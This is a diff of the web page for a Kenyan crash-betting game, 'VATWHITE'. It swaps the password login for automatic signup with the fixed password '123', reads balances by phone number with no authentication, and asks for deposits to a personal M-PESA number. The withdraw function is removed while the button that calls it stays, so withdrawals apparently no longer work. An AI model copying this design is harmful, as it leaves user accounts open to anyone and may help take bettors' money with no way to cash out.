@@ -1,96 +1,106 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="/socket.io/socket.io.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; margin: 0; overflow: hidden; }
-        .auth-screen { padding: 20px; text-align: center; }
-        .game-screen { display: none; }
-        input { width: 90%; padding: 12px; margin: 8px 0; background: #1a1a1a; border: 1px solid gold; color: #fff; border-radius: 5px; }
-        .btn { width: 95%; padding: 15px; background: gold; color: black; font-weight: bold; border: none; border-radius: 5px; text-transform: uppercase; }
-        .header { display: flex; justify-content: space-between; padding: 10px; background: #1b1c1d; border-bottom: 2px solid gold; }
-        #stage { height: 280px; position: relative; background: radial-gradient(circle at bottom left, #333, #000); }
-        #multiplier { position: absolute; top: 35%; width: 100%; text-align: center; font-size: 4rem; font-weight: 900; z-index: 10; text-shadow: 0 0 10px rgba(255,255,255,0.5); }
-        .bet-area { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; }
-        #plane-wrap { position: absolute; bottom: 20px; left: 10%; z-index: 5; }
+        .header { display: flex; justify-content: space-between; padding: 12px; background: #000; border-bottom: 2px solid gold; }
+        #stage { height: 320px; position: relative; background: #000; overflow: hidden; }
+        #multiplier { position: absolute; top: 35%; width: 100%; text-align: center; font-size: 4.5rem; font-weight: 900; }
+        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; padding: 10px; }
+        .btn { padding: 18px; border: none; border-radius: 8px; font-weight: bold; font-size: 1rem; color: white; cursor: pointer; }
+        .btn-bet { background: #28a745; }
+        .btn-withdraw { background: #d91d1d; }
+        .btn-deposit { background: linear-gradient(to right, gold, #b8860b); color: black; }
+        #rocket-wrap { position: absolute; bottom: 20px; left: 10%; z-index: 5; }
+        .info-box { background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 8px; border-radius: 5px; font-size: 0.8rem; margin-top: 5px; }
     </style>
 </head>
-<body onload="checkLogin()">
-    <div id="auth" class="auth-screen">
+<body onload="checkUser()">
+    <div id="auth" style="padding:40px; text-align:center;">
         <img src="1000002704.jpg" width="100" style="border-radius:50%;">
-        <h2>VATWHITE KENYA</h2>
-        <input type="text" id="phone" placeholder="Phone Number">
-        <input type="password" id="pass" placeholder="Password">
-        <button class="btn" onclick="login()">LOGIN TO PLAY</button>
+        <h2>VATWHITE JOIN</h2>
+        <input type="text" id="phone" placeholder="Phone Number" style="width:90%; padding:15px; margin:10px 0; background:#111; color:white; border:1px solid gold;">
+        <button class="btn btn-bet" style="width:100%" onclick="login()">START PLAYING</button>
     </div>
 
-    <div id="game" class="game-screen">
+    <div id="game" style="display:none;">
         <div class="header">
-            <div style="color:gold; font-weight:bold;"><img src="1000002704.jpg" width="25" style="border-radius:50%;"> VATWHITE</div>
-            <div style="color:#28a745; font-weight:bold;"><span id="u_bal">0.00</span> KES</div>
+            <div style="color:gold; font-weight:bold;">VATWHITE</div>
+            <div style="color:#28a745; font-weight:bold;"><span id="bal_val">0.00</span> KES</div>
         </div>
+
         <div id="stage">
             <div id="multiplier">1.00x</div>
-            <div id="plane-wrap"><img src="1000002704.jpg" width="65" style="border-radius:50%; box-shadow: 0 0 15px gold;"></div>
+            <div id="rocket-wrap" style="font-size: 60px;">🚀</div>
             <svg style="position:absolute; width:100%; height:100%;"><path id="gold-path" d="" fill="none" stroke="gold" stroke-width="4"/></svg>
         </div>
-        <div class="bet-area">
-            <button class="btn" style="background:#28a745; color:white;">BET KES 20</button>
-            <button class="btn" style="background:#d91d1d; color:white;" onclick="withdraw()">WITHDRAW</button>
+
+        <div class="controls">
+            <button class="btn btn-bet">BET KES 20</button>
+            <button class="btn btn-withdraw" onclick="withdraw()">WITHDRAW</button>
+            <button class="btn btn-bet">BET KES 50</button>
+            <div class="info-box">Lipa na M-PESA kwenda:<br>0702170114</div>
+            <button class="btn btn-deposit" onclick="alert('Lipa 0702170114 kisha subiri salio.')">DEPOSIT</button>
+            <button class="btn" style="background:#333" onclick="logout()">LOGOUT</button>
         </div>
     </div>
 
-    <audio id="planeSound" loop><source src="https://www.soundjay.com/transportation/sounds/jet-engine-takeoff-01.mp3" type="audio/mpeg"></audio>
+    <audio id="sound" loop><source src="https://www.soundjay.com/transportation/sounds/jet-engine-takeoff-01.mp3"></audio>
 
     <script>
         const socket = io();
         let x = 0; let y = 0;
-        const sound = document.getElementById('planeSound');
+        const sound = document.getElementById('sound');
 
-        function checkLogin() {
-            if(localStorage.getItem('userPhone')) {
+        function checkUser() {
+            const phone = localStorage.getItem('vatPhone');
+            if(phone) {
                 document.getElementById('auth').style.display = 'none';
                 document.getElementById('game').style.display = 'block';
+                fetchBalance(phone);
             }
         }
 
-        function login() {
-            let p = document.getElementById('phone').value;
-            if(p) { localStorage.setItem('userPhone', p); checkLogin(); }
+        async function login() {
+            const phone = document.getElementById('phone').value;
+            if(!phone) return;
+            const res = await fetch('/signup', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone, firstname: 'User', password: '123' })
+            });
+            localStorage.setItem('vatPhone', phone);
+            checkUser();
         }
 
-        async function withdraw() {
-            let amt = prompt("Kiasi gani unatoa? (KES):");
-            if(amt) {
-                await fetch('/withdraw', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ phone: localStorage.getItem('userPhone'), amount: amt })
-                });
-                alert("Withdrawal request sent to Admin panel.");
-            }
+        function logout() { localStorage.removeItem('vatPhone'); location.reload(); }
+
+        async function fetchBalance(phone) {
+            const res = await fetch('/get-balance/' + phone);
+            const data = await res.json();
+            document.getElementById('bal_val').innerText = data.balance;
         }
 
         socket.on('tick', (m) => {
             document.getElementById('multiplier').innerText = m + "x";
             sound.play();
-            // Speed ya kusogea kwa picha (Inaenda kasi zaidi)
-            x += 2.5; y += 1.8;
-            document.getElementById('plane-wrap').style.transform = `translate(${x}px, -${y}px)`;
-            document.getElementById('gold-path').setAttribute('d', `M 0 280 Q ${x/2} 280, ${x+35} ${280-y}`);
+            x += 2.2; y += 1.6;
+            document.getElementById('rocket-wrap').style.transform = `translate(${x}px, -${y}px)`;
+            document.getElementById('gold-path').setAttribute('d', `M 0 320 Q ${x/2} 320, ${x+40} ${320-y}`);
         });
 
         socket.on('crash', () => {
             sound.pause(); sound.currentTime = 0;
             document.getElementById('multiplier').style.color = 'red';
-            document.getElementById('plane-wrap').innerHTML = '<span style="font-size:50px">💥</span>';
+            document.getElementById('rocket-wrap').innerHTML = '💥';
         });
 
         socket.on('new_game', () => {
             x = 0; y = 0;
             document.getElementById('multiplier').style.color = 'white';
-            document.getElementById('plane-wrap').innerHTML = '<img src="1000002704.jpg" width="65" style="border-radius:50%; box-shadow: 0 0 15px gold;">';
+            document.getElementById('rocket-wrap').innerHTML = '🚀';
             document.getElementById('gold-path').setAttribute('d', '');
         });
     </script>
